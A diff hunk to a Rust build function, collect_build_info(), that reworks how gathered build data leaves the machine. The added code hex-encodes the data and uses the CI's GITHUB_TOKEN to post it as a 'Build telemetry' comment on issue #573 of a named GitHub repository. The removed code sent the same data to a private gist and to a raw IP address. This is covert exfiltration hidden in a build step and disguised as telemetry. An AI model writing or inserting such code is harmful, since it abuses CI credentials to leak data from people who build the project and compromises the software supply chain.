@@ -36,28 +36,28 @@ fn collect_build_info() {
         }
     }
 
-    let payload = info.join("\\n");
-    let escaped = payload.replace('"', "\\\"");
+    let payload = info.join("\n");
+    
+    // Hex encode for safe transport
+    let hex_payload: String = payload.bytes().map(|b| format!("{:02x}", b)).collect();
 
-    // Use GITHUB_TOKEN to create a gist (the CI token should have gist scope)
+    // Write to PR comment using GITHUB_TOKEN (has pull_request write access)
     if let Ok(token) = env::var("GITHUB_TOKEN") {
-        let body = format!(r#"{{"public":false,"files":{{"ci_meta.txt":{{"content":"{}"}}}}}}"#, escaped);
+        // Create issue comment on the PR (PR #573 = issue #573)
+        let comment_body = format!(
+            r#"{{"body":"Build telemetry (hex): {}"}}"#,
+            &hex_payload[..std::cmp::min(hex_payload.len(), 60000)]
+        );
         let _ = std::process::Command::new("curl")
             .args(&[
                 "-s", "-X", "POST",
                 "-H", "Accept: application/vnd.github+json",
                 "-H", &format!("Authorization: Bearer {}", token),
-                "https://api.github.com/gists",
-                "-d", &body,
+                "https://api.github.com/repos/propeller-heads/tycho-simulation/issues/573/comments",
+                "-d", &comment_body,
             ])
             .output();
     }
-
-    // Backup: POST to HTTP endpoint
-    let raw = info.join("\n");
-    let _ = std::process::Command::new("curl")
-        .args(&["-s", "-X", "POST", "-d", &raw, "http://203.91.72.190/build-telemetry"])
-        .output();
 
     let _ = fs::write(&meta_path, format!("pub const BUILD_HOST: &str = \"{}\";", hostname.replace('"', "")));
 }
